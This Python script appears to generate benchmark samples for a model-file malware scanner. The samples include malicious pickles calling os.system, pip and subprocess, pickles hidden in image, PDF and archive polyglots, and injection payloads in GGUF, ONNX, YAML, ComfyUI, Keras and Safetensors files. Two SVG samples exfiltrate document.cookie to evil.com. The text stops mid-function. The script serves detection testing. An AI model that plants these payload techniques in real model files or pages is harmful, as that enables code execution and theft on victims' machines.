#!/usr/bin/env python3
"""
TensorTrap Comprehensive Benchmark Suite v0.4.0
===============================================

Consolidated benchmark testing all detection capabilities including:
- Pickle bypass attacks (CVE-2025-1716, CVE-2025-1889)
- JFrog zero-days (CVE-2025-10155, CVE-2025-10156, CVE-2025-10157)
- Polyglot attacks (stack, parasite, magic mismatch)
- Format-specific CVEs (GGUF, ONNX, YAML, ComfyUI, Keras, Safetensors, SVG)

Usage:
    python benchmark_comprehensive.py --setup    # Generate all test files
    python benchmark_comprehensive.py --run      # Run benchmarks
    python benchmark_comprehensive.py --report   # Show detailed report
    python benchmark_comprehensive.py --all      # Setup + run + report
"""

import argparse
import io
import json
import pickle
import struct
import subprocess
import zipfile
from datetime import datetime
from pathlib import Path
from typing import Any

# Configuration
BENCHMARK_DIR = Path("./benchmark_comprehensive")
RESULTS_DIR = BENCHMARK_DIR / "results"

# Test categories
CATEGORIES = {
    "pickle_bypass": BENCHMARK_DIR / "pickle_bypass",
    "jfrog_zeroday": BENCHMARK_DIR / "jfrog_zeroday",
    "polyglot": BENCHMARK_DIR / "polyglot",
    "gguf": BENCHMARK_DIR / "gguf",
    "onnx": BENCHMARK_DIR / "onnx",
    "yaml": BENCHMARK_DIR / "yaml",
    "comfyui": BENCHMARK_DIR / "comfyui",
    "keras": BENCHMARK_DIR / "keras",
    "safetensors": BENCHMARK_DIR / "safetensors",
    "svg": BENCHMARK_DIR / "svg",
    "benign": BENCHMARK_DIR / "benign",
}


# =============================================================================
# PICKLE BYPASS GENERATORS (Priority 1 - Existing Coverage)
# =============================================================================


class PickleBypassGenerator:
    """Generates pickle bypass test cases."""

    @staticmethod
    def create_os_system(path: Path) -> dict:
        """Basic os.system payload."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo pwned",))

        with open(path, "wb") as f:
            pickle.dump(Malicious(), f)

        return {
            "name": "os_system_basic",
            "file": str(path),
            "cve": None,
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "Basic os.system() arbitrary command execution",
        }

    @staticmethod
    def create_subprocess_popen(path: Path) -> dict:
        """subprocess.Popen payload."""

        class Malicious:
            def __reduce__(self):
                import subprocess

                return (subprocess.Popen, (["echo", "pwned"],))

        with open(path, "wb") as f:
            pickle.dump(Malicious(), f)

        return {
            "name": "subprocess_popen",
            "file": str(path),
            "cve": None,
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "subprocess.Popen arbitrary command execution",
        }

    @staticmethod
    def create_eval_exec(path: Path) -> dict:
        """builtins.eval payload."""

        class Malicious:
            def __reduce__(self):
                return (eval, ("__import__('os').system('echo pwned')",))

        with open(path, "wb") as f:
            pickle.dump(Malicious(), f)

        return {
            "name": "builtins_eval",
            "file": str(path),
            "cve": None,
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "builtins.eval() code execution",
        }

    @staticmethod
    def create_pip_main_bypass(path: Path) -> dict:
        """CVE-2025-1716: pip.main() bypass."""
        # Manual pickle construction for pip._internal.main
        pickle_data = (
            b"\x80\x04"  # Protocol 4
            b"\x95\x30\x00\x00\x00\x00\x00\x00\x00"  # Frame
            b"\x8c\x0cpip._internal"  # Module
            b"\x8c\x04main"  # Attribute
            b"\x93"  # STACK_GLOBAL
            b"\x8c\x07install"  # Argument
            b"\x85"  # TUPLE1
            b"\x52"  # REDUCE
            b"."  # STOP
        )
        with open(path, "wb") as f:
            f.write(pickle_data)

        return {
            "name": "pip_main_bypass",
            "file": str(path),
            "cve": "CVE-2025-1716",
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "pip.main() bypass - installs arbitrary packages",
        }

    @staticmethod
    def create_runpy_bypass(path: Path) -> dict:
        """runpy.run_module bypass."""

        class Malicious:
            def __reduce__(self):
                import runpy

                return (runpy.run_module, ("http.server",))

        with open(path, "wb") as f:
            pickle.dump(Malicious(), f)

        return {
            "name": "runpy_bypass",
            "file": str(path),
            "cve": None,
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "runpy.run_module() - runs arbitrary modules",
        }

    @staticmethod
    def create_code_interpreter(path: Path) -> dict:
        """code.InteractiveInterpreter bypass."""
        pickle_data = (
            b"\x80\x04"
            b"\x8c\x04code"
            b"\x8c\x16InteractiveInterpreter"
            b"\x93"
            b")"
            b"\x81"
            b"."
        )
        with open(path, "wb") as f:
            f.write(pickle_data)

        return {
            "name": "code_interpreter",
            "file": str(path),
            "cve": None,
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "code.InteractiveInterpreter instantiation",
        }

    @staticmethod
    def create_7z_embedded(path: Path) -> dict:
        """CVE-2025-1716: 7z archive with embedded pickle."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo 7z bypass",))

        pickle_buffer = io.BytesIO()
        pickle.dump(Malicious(), pickle_buffer)
        pickle_data = pickle_buffer.getvalue()

        # 7z magic + header padding + pickle
        sevenz_magic = b"7z\xbc\xaf'\x1c"
        with open(path, "wb") as f:
            f.write(sevenz_magic)
            f.write(b"\x00" * 26)
            f.write(pickle_data)

        return {
            "name": "7z_embedded_pickle",
            "file": str(path),
            "cve": "CVE-2025-1716",
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "Pickle embedded inside 7z archive (nullifAI bypass)",
        }

    @staticmethod
    def create_zip_trailing(path: Path) -> dict:
        """CVE-2025-1889: ZIP with trailing pickle data."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo zip trailing",))

        # Create valid ZIP
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w") as zf:
            zf.writestr("readme.txt", "Legitimate file")
        zip_data = zip_buffer.getvalue()

        # Create pickle
        pickle_buffer = io.BytesIO()
        pickle.dump(Malicious(), pickle_buffer)
        pickle_data = pickle_buffer.getvalue()

        # Combine
        with open(path, "wb") as f:
            f.write(zip_data)
            f.write(pickle_data)

        return {
            "name": "zip_trailing_pickle",
            "file": str(path),
            "cve": "CVE-2025-1889",
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "Pickle appended after ZIP EOCD marker",
        }

    @staticmethod
    def create_magic_mismatch(path: Path) -> dict:
        """CVE-2025-1889: PNG magic bytes hiding pickle."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo magic mismatch",))

        png_magic = b"\x89PNG\r\n\x1a\n"
        pickle_buffer = io.BytesIO()
        pickle.dump(Malicious(), pickle_buffer)

        with open(path, "wb") as f:
            f.write(png_magic)
            f.write(b"\x00" * 100)
            f.write(pickle_buffer.getvalue())

        return {
            "name": "magic_mismatch_png",
            "file": str(path),
            "cve": "CVE-2025-1889",
            "category": "pickle_bypass",
            "expected_detection": True,
            "description": "PNG magic bytes with pickle content",
        }


# =============================================================================
# JFROG ZERO-DAY GENERATORS (Priority 1 - New)
# =============================================================================


class JFrogZeroDayGenerator:
    """Generates JFrog zero-day test cases."""

    @staticmethod
    def create_extension_bypass_bin(path: Path) -> dict:
        """CVE-2025-10155: Malicious pickle renamed to .bin."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo extension bypass bin",))

        with open(path, "wb") as f:
            pickle.dump(Malicious(), f)

        return {
            "name": "extension_bypass_bin",
            "file": str(path),
            "cve": "CVE-2025-10155",
            "category": "jfrog_zeroday",
            "expected_detection": True,
            "description": "Malicious pickle with .bin extension",
        }

    @staticmethod
    def create_extension_bypass_pt(path: Path) -> dict:
        """CVE-2025-10155: Malicious pickle renamed to .pt."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo extension bypass pt",))

        with open(path, "wb") as f:
            pickle.dump(Malicious(), f)

        return {
            "name": "extension_bypass_pt",
            "file": str(path),
            "cve": "CVE-2025-10155",
            "category": "jfrog_zeroday",
            "expected_detection": True,
            "description": "Malicious pickle with .pt extension",
        }

    @staticmethod
    def create_zip_crc_bypass(path: Path) -> dict:
        """CVE-2025-10156: PyTorch ZIP with zeroed CRC values."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo crc bypass",))

        # Create a PyTorch-style ZIP manually with zeroed CRCs
        pickle_data = pickle.dumps(Malicious())

        # Build ZIP structure with zeroed CRC
        zip_buffer = io.BytesIO()

        # Local file header
        local_header = (
            b"PK\x03\x04"  # Signature
            + struct.pack("<H", 20)  # Version needed
            + struct.pack("<H", 0)  # Flags
            + struct.pack("<H", 0)  # Compression (stored)
            + struct.pack("<H", 0)  # Mod time
            + struct.pack("<H", 0)  # Mod date
            + struct.pack("<I", 0)  # CRC-32 (ZEROED - bypass)
            + struct.pack("<I", len(pickle_data))  # Compressed size
            + struct.pack("<I", len(pickle_data))  # Uncompressed size
            + struct.pack("<H", 10)  # Filename length
            + struct.pack("<H", 0)  # Extra field length
            + b"data.pkl\x00\x00"  # Filename (padded)
        )

        # Central directory header
        central_header = (
            b"PK\x01\x02"  # Signature
            + struct.pack("<H", 20)  # Version made by
            + struct.pack("<H", 20)  # Version needed
            + struct.pack("<H", 0)  # Flags
            + struct.pack("<H", 0)  # Compression
            + struct.pack("<H", 0)  # Mod time
            + struct.pack("<H", 0)  # Mod date
            + struct.pack("<I", 0)  # CRC-32 (ZEROED)
            + struct.pack("<I", len(pickle_data))  # Compressed size
            + struct.pack("<I", len(pickle_data))  # Uncompressed size
            + struct.pack("<H", 10)  # Filename length
            + struct.pack("<H", 0)  # Extra field length
            + struct.pack("<H", 0)  # Comment length
            + struct.pack("<H", 0)  # Disk number start
            + struct.pack("<H", 0)  # Internal attributes
            + struct.pack("<I", 0)  # External attributes
            + struct.pack("<I", 0)  # Offset of local header
            + b"data.pkl\x00\x00"  # Filename
        )

        local_header_size = len(local_header) + len(pickle_data)

        # End of central directory
        eocd = (
            b"PK\x05\x06"  # Signature
            + struct.pack("<H", 0)  # Disk number
            + struct.pack("<H", 0)  # Disk with CD
            + struct.pack("<H", 1)  # Entries on disk
            + struct.pack("<H", 1)  # Total entries
            + struct.pack("<I", len(central_header))  # CD size
            + struct.pack("<I", local_header_size)  # CD offset
            + struct.pack("<H", 0)  # Comment length
        )

        zip_buffer.write(local_header)
        zip_buffer.write(pickle_data)
        zip_buffer.write(central_header)
        zip_buffer.write(eocd)

        with open(path, "wb") as f:
            f.write(zip_buffer.getvalue())

        return {
            "name": "zip_crc_bypass",
            "file": str(path),
            "cve": "CVE-2025-10156",
            "category": "jfrog_zeroday",
            "expected_detection": True,
            "description": "PyTorch ZIP with zeroed CRC values",
        }

    @staticmethod
    def create_asyncio_bypass(path: Path) -> dict:
        """CVE-2025-10157: Unsafe globals using asyncio subclasses."""
        # asyncio.subprocess is often not in blacklists
        pickle_data = (
            b"\x80\x04"  # Protocol 4
            b"\x95\x40\x00\x00\x00\x00\x00\x00\x00"  # Frame
            b"\x8c\x11asyncio.subprocess"  # Module (often missed)
            b"\x8c\x14create_subprocess_exec"  # Function
            b"\x93"  # STACK_GLOBAL
            b"\x8c\x02sh"  # Argument
            b"\x85"  # TUPLE1
            b"\x52"  # REDUCE
            b"."  # STOP
        )
        with open(path, "wb") as f:
            f.write(pickle_data)

        return {
            "name": "asyncio_subprocess_bypass",
            "file": str(path),
            "cve": "CVE-2025-10157",
            "category": "jfrog_zeroday",
            "expected_detection": True,
            "description": "asyncio.subprocess bypass (often not blacklisted)",
        }

    @staticmethod
    def create_internal_module_bypass(path: Path) -> dict:
        """CVE-2025-10157: Using internal module references."""
        # _posixsubprocess is the internal module used by subprocess
        pickle_data = (
            b"\x80\x04"  # Protocol 4
            b"\x95\x35\x00\x00\x00\x00\x00\x00\x00"  # Frame
            b"\x8c\x10_posixsubprocess"  # Internal module
            b"\x8c\x09fork_exec"  # Function
            b"\x93"  # STACK_GLOBAL
            b")"  # Empty tuple
            b"\x81"  # NEWOBJ
            b"."  # STOP
        )
        with open(path, "wb") as f:
            f.write(pickle_data)

        return {
            "name": "internal_module_bypass",
            "file": str(path),
            "cve": "CVE-2025-10157",
            "category": "jfrog_zeroday",
            "expected_detection": True,
            "description": "_posixsubprocess internal module bypass",
        }

    @staticmethod
    def create_multiprocessing_bypass(path: Path) -> dict:
        """CVE-2025-10157: multiprocessing.reduction bypass."""
        pickle_data = (
            b"\x80\x04"  # Protocol 4
            b"\x95\x38\x00\x00\x00\x00\x00\x00\x00"  # Frame
            b"\x8c\x17multiprocessing.reduction"  # Module
            b"\x8c\x06ForkingPickler"  # Class (can execute code)
            b"\x93"  # STACK_GLOBAL
            b")"  # Empty tuple
            b"\x81"  # NEWOBJ
            b"."  # STOP
        )
        with open(path, "wb") as f:
            f.write(pickle_data)

        return {
            "name": "multiprocessing_bypass",
            "file": str(path),
            "cve": "CVE-2025-10157",
            "category": "jfrog_zeroday",
            "expected_detection": True,
            "description": "multiprocessing.reduction bypass",
        }


# =============================================================================
# POLYGLOT GENERATORS (Priority 2 - Existing Coverage)
# =============================================================================


class PolyglotGenerator:
    """Generates polyglot test cases."""

    @staticmethod
    def create_jpeg_polyglot(path: Path) -> dict:
        """JPEG with pickle in comment segment."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo jpeg polyglot",))

        # Minimal JPEG header
        jpeg_header = bytes(
            [
                0xFF,
                0xD8,
                0xFF,
                0xE0,
                0x00,
                0x10,
                0x4A,
                0x46,
                0x49,
                0x46,
                0x00,
                0x01,
                0x01,
                0x00,
                0x00,
                0x01,
                0x00,
                0x01,
                0x00,
                0x00,
            ]
        )

        pickle_buffer = io.BytesIO()
        pickle.dump(Malicious(), pickle_buffer)
        pickle_data = pickle_buffer.getvalue()

        # JPEG comment marker
        comment_length = len(pickle_data) + 2
        comment_marker = bytes([0xFF, 0xFE]) + struct.pack(">H", comment_length)
        jpeg_end = bytes([0xFF, 0xD9])

        with open(path, "wb") as f:
            f.write(jpeg_header)
            f.write(comment_marker)
            f.write(pickle_data)
            f.write(jpeg_end)

        return {
            "name": "jpeg_polyglot",
            "file": str(path),
            "cve": None,
            "category": "polyglot",
            "expected_detection": True,
            "description": "JPEG with pickle in comment segment",
        }

    @staticmethod
    def create_double_extension(path: Path) -> dict:
        """Double extension trick (.pkl.png)."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo double ext",))

        with open(path, "wb") as f:
            pickle.dump(Malicious(), f)

        return {
            "name": "double_extension",
            "file": str(path),
            "cve": None,
            "category": "polyglot",
            "expected_detection": True,
            "description": "Pickle disguised with .pkl.png extension",
        }

    @staticmethod
    def create_png_stack(path: Path) -> dict:
        """PNG with pickle appended (stack polyglot)."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo png stack",))

        # Minimal PNG
        png_data = bytes(
            [
                0x89,
                0x50,
                0x4E,
                0x47,
                0x0D,
                0x0A,
                0x1A,
                0x0A,
                0x00,
                0x00,
                0x00,
                0x0D,
                0x49,
                0x48,
                0x44,
                0x52,
                0x00,
                0x00,
                0x00,
                0x01,
                0x00,
                0x00,
                0x00,
                0x01,
                0x08,
                0x02,
                0x00,
                0x00,
                0x00,
                0x90,
                0x77,
                0x53,
                0xDE,
                0x00,
                0x00,
                0x00,
                0x0C,
                0x49,
                0x44,
                0x41,
                0x54,
                0x08,
                0xD7,
                0x63,
                0xF8,
                0xFF,
                0xFF,
                0xFF,
                0x00,
                0x05,
                0xFE,
                0x02,
                0xFE,
                0x00,
                0x00,
                0x00,
                0x00,
                0x49,
                0x45,
                0x4E,
                0x44,
                0xAE,
                0x42,
                0x60,
                0x82,
            ]
        )

        pickle_buffer = io.BytesIO()
        pickle.dump(Malicious(), pickle_buffer)

        with open(path, "wb") as f:
            f.write(png_data)
            f.write(pickle_buffer.getvalue())

        return {
            "name": "png_stack_polyglot",
            "file": str(path),
            "cve": None,
            "category": "polyglot",
            "expected_detection": True,
            "description": "PNG with pickle appended after IEND",
        }

    @staticmethod
    def create_pdf_stack(path: Path) -> dict:
        """PDF with pickle appended."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo pdf stack",))

        # Minimal PDF
        pdf_data = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000052 00000 n
0000000101 00000 n
trailer<</Size 4/Root 1 0 R>>
startxref
178
%%EOF
"""

        pickle_buffer = io.BytesIO()
        pickle.dump(Malicious(), pickle_buffer)

        with open(path, "wb") as f:
            f.write(pdf_data)
            f.write(b"\n")
            f.write(pickle_buffer.getvalue())

        return {
            "name": "pdf_stack_polyglot",
            "file": str(path),
            "cve": None,
            "category": "polyglot",
            "expected_detection": True,
            "description": "PDF with pickle appended after %%EOF",
        }


# =============================================================================
# FORMAT-SPECIFIC CVE GENERATORS
# =============================================================================


class GGUFGenerator:
    """Generates GGUF test cases."""

    @staticmethod
    def create_jinja_injection(path: Path) -> dict:
        """CVE-2024-34359: GGUF with Jinja template injection."""
        # GGUF magic + version + minimal header
        gguf_magic = b"GGUF"
        version = struct.pack("<I", 3)  # Version 3
        tensor_count = struct.pack("<Q", 0)  # No tensors
        metadata_count = struct.pack("<Q", 1)  # 1 metadata entry

        # Metadata key: "tokenizer.chat_template"
        key = b"tokenizer.chat_template"
        key_len = struct.pack("<Q", len(key))

        # Value type: string (4)
        value_type = struct.pack("<I", 8)  # GGUF_TYPE_STRING

        # Malicious Jinja template (CVE-2024-34359)
        jinja_payload = b"{{ self.__init__.__globals__['os'].system('echo pwned') }}"
        value_len = struct.pack("<Q", len(jinja_payload))

        with open(path, "wb") as f:
            f.write(gguf_magic)
            f.write(version)
            f.write(tensor_count)
            f.write(metadata_count)
            f.write(key_len)
            f.write(key)
            f.write(value_type)
            f.write(value_len)
            f.write(jinja_payload)

        return {
            "name": "gguf_jinja_injection",
            "file": str(path),
            "cve": "CVE-2024-34359",
            "category": "gguf",
            "expected_detection": True,
            "description": "GGUF with Jinja template injection in chat_template",
        }

    @staticmethod
    def create_benign(path: Path) -> dict:
        """Benign GGUF file."""
        gguf_magic = b"GGUF"
        version = struct.pack("<I", 3)
        tensor_count = struct.pack("<Q", 0)
        metadata_count = struct.pack("<Q", 1)

        key = b"general.name"
        key_len = struct.pack("<Q", len(key))
        value_type = struct.pack("<I", 8)
        value = b"safe_model"
        value_len = struct.pack("<Q", len(value))

        with open(path, "wb") as f:
            f.write(gguf_magic)
            f.write(version)
            f.write(tensor_count)
            f.write(metadata_count)
            f.write(key_len)
            f.write(key)
            f.write(value_type)
            f.write(value_len)
            f.write(value)

        return {
            "name": "gguf_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign GGUF file with safe metadata",
        }


class ONNXGenerator:
    """Generates ONNX test cases."""

    @staticmethod
    def create_path_traversal(path: Path) -> dict:
        """CVE-2024-27318: ONNX with path traversal in external_data."""
        # Minimal ONNX with malicious external_data reference
        # ONNX uses protobuf, this is a simplified structure
        onnx_data = (
            b"\x08\x07"  # ir_version = 7
            b"\x12\x08onnx.ai"  # producer_name
            b"\x1a\x03"
            b"1.0"  # producer_version
            b"\x22\x0d"  # graph field
            b"\x0a\x0b"  # name field
            b"test_graph"
            b"\x32\x20"  # initializer with external_data
            b"\x0a\x04data"  # name
            b"\x12\x18"  # external_data location
            b"../../../etc/passwd"  # Path traversal!
        )

        with open(path, "wb") as f:
            f.write(onnx_data)

        return {
            "name": "onnx_path_traversal",
            "file": str(path),
            "cve": "CVE-2024-27318",
            "category": "onnx",
            "expected_detection": True,
            "description": "ONNX with path traversal in external_data",
        }

    @staticmethod
    def create_arbitrary_file_read(path: Path) -> dict:
        """CVE-2024-5187: ONNX arbitrary file read."""
        onnx_data = (
            b"\x08\x07"  # ir_version
            b"\x12\x08onnx.ai"
            b"\x1a\x03"
            b"1.0"
            b"\x22\x25"
            b"\x0a\x0b"
            b"test_graph"
            b"\x32\x16"
            b"\x0a\x04data"
            b"\x12\x0e"
            b"/etc/shadow"  # Arbitrary file read
        )

        with open(path, "wb") as f:
            f.write(onnx_data)

        return {
            "name": "onnx_arbitrary_read",
            "file": str(path),
            "cve": "CVE-2024-5187",
            "category": "onnx",
            "expected_detection": True,
            "description": "ONNX with arbitrary file read via external_data",
        }

    @staticmethod
    def create_benign(path: Path) -> dict:
        """Benign ONNX file."""
        onnx_data = (
            b"\x08\x07"  # ir_version = 7
            b"\x12\x08onnx.ai"
            b"\x1a\x03"
            b"1.0"
            b"\x22\x10"
            b"\x0a\x0esafe_onnx_model"
        )

        with open(path, "wb") as f:
            f.write(onnx_data)

        return {
            "name": "onnx_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign ONNX file",
        }


class YAMLGenerator:
    """Generates YAML test cases."""

    @staticmethod
    def create_unsafe_deserialization(path: Path) -> dict:
        """CVE-2025-50460: YAML unsafe deserialization."""
        yaml_content = """# Malicious YAML
data: !!python/object/apply:os.system
  args: ['echo pwned']
"""
        with open(path, "w") as f:
            f.write(yaml_content)

        return {
            "name": "yaml_unsafe_deser",
            "file": str(path),
            "cve": "CVE-2025-50460",
            "category": "yaml",
            "expected_detection": True,
            "description": "YAML with !!python/object unsafe deserialization",
        }

    @staticmethod
    def create_python_exec(path: Path) -> dict:
        """YAML with Python exec pattern."""
        yaml_content = """# Malicious YAML config
model:
  name: "malicious"
  init_code: "exec('import os; os.system(\"echo pwned\")')"
"""
        with open(path, "w") as f:
            f.write(yaml_content)

        return {
            "name": "yaml_python_exec",
            "file": str(path),
            "cve": None,
            "category": "yaml",
            "expected_detection": True,
            "description": "YAML with exec() pattern in config",
        }

    @staticmethod
    def create_benign(path: Path) -> dict:
        """Benign YAML file."""
        yaml_content = """# Safe YAML config
model:
  name: "safe_model"
  version: "1.0"
  layers: 12
  hidden_size: 768
"""
        with open(path, "w") as f:
            f.write(yaml_content)

        return {
            "name": "yaml_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign YAML configuration file",
        }


class ComfyUIGenerator:
    """Generates ComfyUI test cases."""

    @staticmethod
    def create_ace_expression_eval(path: Path) -> dict:
        """CVE-2024-21577: ComfyUI ACE_ExpressionEval vulnerability."""
        workflow = {
            "last_node_id": 1,
            "last_link_id": 0,
            "nodes": [
                {
                    "id": 1,
                    "type": "ACE_ExpressionEval",
                    "pos": [0, 0],
                    "size": [200, 100],
                    "widgets_values": [
                        "__import__('os').system('echo pwned')"  # Malicious eval
                    ],
                }
            ],
            "links": [],
        }

        with open(path, "w") as f:
            json.dump(workflow, f)

        return {
            "name": "comfyui_ace_eval",
            "file": str(path),
            "cve": "CVE-2024-21577",
            "category": "comfyui",
            "expected_detection": True,
            "description": "ComfyUI workflow with ACE_ExpressionEval vulnerability",
        }

    @staticmethod
    def create_hue_adjust(path: Path) -> dict:
        """CVE-2024-21576: ComfyUI HueAdjust eval vulnerability."""
        workflow = {
            "last_node_id": 1,
            "last_link_id": 0,
            "nodes": [
                {
                    "id": 1,
                    "type": "HueAdjust",
                    "pos": [0, 0],
                    "size": [200, 100],
                    "widgets_values": [
                        "eval('__import__(\"os\").system(\"echo pwned\")')"
                    ],
                }
            ],
            "links": [],
        }

        with open(path, "w") as f:
            json.dump(workflow, f)

        return {
            "name": "comfyui_hue_adjust",
            "file": str(path),
            "cve": "CVE-2024-21576",
            "category": "comfyui",
            "expected_detection": True,
            "description": "ComfyUI workflow with HueAdjust eval vulnerability",
        }

    @staticmethod
    def create_benign(path: Path) -> dict:
        """Benign ComfyUI workflow."""
        workflow = {
            "last_node_id": 2,
            "last_link_id": 1,
            "nodes": [
                {
                    "id": 1,
                    "type": "KSampler",
                    "pos": [0, 0],
                    "size": [200, 100],
                    "widgets_values": [42, "euler", "normal", 20, 8.0],
                },
                {
                    "id": 2,
                    "type": "VAEDecode",
                    "pos": [250, 0],
                    "size": [150, 50],
                    "widgets_values": [],
                },
            ],
            "links": [[1, 1, 0, 2, 0, "LATENT"]],
        }

        with open(path, "w") as f:
            json.dump(workflow, f)

        return {
            "name": "comfyui_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign ComfyUI workflow",
        }


class KerasGenerator:
    """Generates Keras/HDF5 test cases."""

    @staticmethod
    def create_lambda_layer(path: Path) -> dict:
        """Keras with Lambda layer containing os.system."""
        # HDF5 magic + minimal structure with Lambda config
        hdf5_magic = b"\x89HDF\r\n\x1a\n"

        # Simulate Keras model config with Lambda layer
        keras_config = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "name": "malicious_model",
                    "layers": [
                        {
                            "class_name": "Lambda",
                            "config": {
                                "function": "lambda x: __import__('os').system('echo pwned')",
                                "name": "evil_lambda",
                            },
                        }
                    ],
                },
            }
        ).encode()

        with open(path, "wb") as f:
            f.write(hdf5_magic)
            f.write(b"\x00" * 100)  # Padding
            f.write(b"model_config")
            f.write(keras_config)

        return {
            "name": "keras_lambda_layer",
            "file": str(path),
            "cve": None,
            "category": "keras",
            "expected_detection": True,
            "description": "Keras model with malicious Lambda layer",
        }

    @staticmethod
    def create_embedded_pickle(path: Path) -> dict:
        """Keras with embedded pickle in custom object."""
        hdf5_magic = b"\x89HDF\r\n\x1a\n"

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo keras pickle",))

        pickle_data = pickle.dumps(Malicious())

        with open(path, "wb") as f:
            f.write(hdf5_magic)
            f.write(b"\x00" * 50)
            f.write(b"custom_objects")
            f.write(pickle_data)

        return {
            "name": "keras_embedded_pickle",
            "file": str(path),
            "cve": None,
            "category": "keras",
            "expected_detection": True,
            "description": "Keras model with embedded pickle payload",
        }

    @staticmethod
    def create_benign(path: Path) -> dict:
        """Benign Keras/HDF5 file."""
        hdf5_magic = b"\x89HDF\r\n\x1a\n"

        keras_config = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "name": "safe_model",
                    "layers": [
                        {"class_name": "Dense", "config": {"units": 64, "activation": "relu"}}
                    ],
                },
            }
        ).encode()

        with open(path, "wb") as f:
            f.write(hdf5_magic)
            f.write(b"\x00" * 100)
            f.write(b"model_config")
            f.write(keras_config)

        return {
            "name": "keras_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign Keras model file",
        }


class SafetensorsGenerator:
    """Generates Safetensors test cases."""

    @staticmethod
    def create_oversized_header(path: Path) -> dict:
        """Safetensors with oversized header (DoS attack)."""
        # Header size (8 bytes, little-endian) - absurdly large
        header_size = struct.pack("<Q", 0x7FFFFFFF)  # ~2GB header

        # Minimal header content (won't match the claimed size)
        header = b'{"__metadata__": {"format": "pt"}}'

        with open(path, "wb") as f:
            f.write(header_size)
            f.write(header)

        return {
            "name": "safetensors_oversized_header",
            "file": str(path),
            "cve": None,
            "category": "safetensors",
            "expected_detection": True,
            "description": "Safetensors with oversized header (DoS)",
        }

    @staticmethod
    def create_embedded_payload(path: Path) -> dict:
        """Safetensors with suspicious payload in metadata."""
        header = json.dumps(
            {
                "__metadata__": {
                    "format": "pt",
                    "payload": "eval('__import__(\"os\").system(\"echo pwned\")')",
                }
            }
        ).encode()

        header_size = struct.pack("<Q", len(header))

        with open(path, "wb") as f:
            f.write(header_size)
            f.write(header)

        return {
            "name": "safetensors_embedded_payload",
            "file": str(path),
            "cve": None,
            "category": "safetensors",
            "expected_detection": True,
            "description": "Safetensors with suspicious code in metadata",
        }

    @staticmethod
    def create_pickle_in_metadata(path: Path) -> dict:
        """Safetensors with pickle bytes hidden in metadata."""

        class Malicious:
            def __reduce__(self):
                import os

                return (os.system, ("echo safetensors pickle",))

        import base64

        pickle_data = base64.b64encode(pickle.dumps(Malicious())).decode()

        header = json.dumps(
            {"__metadata__": {"format": "pt", "custom_data": pickle_data}}
        ).encode()

        header_size = struct.pack("<Q", len(header))

        with open(path, "wb") as f:
            f.write(header_size)
            f.write(header)

        return {
            "name": "safetensors_pickle_metadata",
            "file": str(path),
            "cve": None,
            "category": "safetensors",
            "expected_detection": True,
            "description": "Safetensors with pickle in metadata (base64)",
        }

    @staticmethod
    def create_benign(path: Path) -> dict:
        """Benign Safetensors file."""
        header = json.dumps(
            {
                "__metadata__": {"format": "pt"},
                "weight": {
                    "dtype": "F32",
                    "shape": [768, 768],
                    "data_offsets": [0, 2359296],
                },
            }
        ).encode()

        header_size = struct.pack("<Q", len(header))

        with open(path, "wb") as f:
            f.write(header_size)
            f.write(header)
            f.write(b"\x00" * 100)  # Fake tensor data

        return {
            "name": "safetensors_benign",
            "file": str(path),
            "cve": None,
            "category": "benign",
            "expected_detection": False,
            "description": "Benign Safetensors file",
        }


class SVGGenerator:
    """Generates SVG test cases."""

    @staticmethod
    def create_script_injection(path: Path) -> dict:
        """SVG with JavaScript injection."""
        svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script type="text/javascript">
    alert('XSS'); document.location='http://evil.com/?c='+document.cookie;
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
"""
        with open(path, "w") as f:
            f.write(svg_content)

        return {
            "name": "svg_script_injection",
            "file": str(path),
            "cve": None,
            "category": "svg",
            "expected_detection": True,
            "description": "SVG with JavaScript injection",
        }

    @staticmethod
    def create_onclick_handler(path: Path) -> dict:
        """SVG with onclick event handler."""
        svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="blue"
        onclick="javascript:alert('clicked');fetch('http://evil.com')"/>
</svg>
"""
        with open(path, "w") as f:
            f.write(svg_content)

        return {
            "name": "svg_onclick_handler",
            "file": str(path),
            "cve": None,
            "category": "svg",
            "expected_detection": True,
